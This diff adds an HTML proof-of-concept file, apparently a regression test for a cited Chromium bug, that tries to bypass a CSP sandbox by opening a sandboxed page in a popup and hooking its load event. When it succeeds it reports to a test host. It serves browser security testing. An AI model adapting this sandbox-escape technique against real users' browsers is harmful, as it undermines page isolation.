@@ -1,0 +1,17 @@
+<!-- Issue: https://issues.chromium.org/issues/40079621 -->
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <title>Bypass CSP Sandbox</title>
+  </head>
+  <body>
+    <h1>Bypass CSP Sandbox</h1>
+
+    <script>
+      w = window.open("sandboxed.html", "", "width=400,height=400");
+      w.onload = function () {
+        document.location.href = "https://a.test/report/?bughog_reproduced=OK";
+      };
+    </script>
+  </body>
+</html>
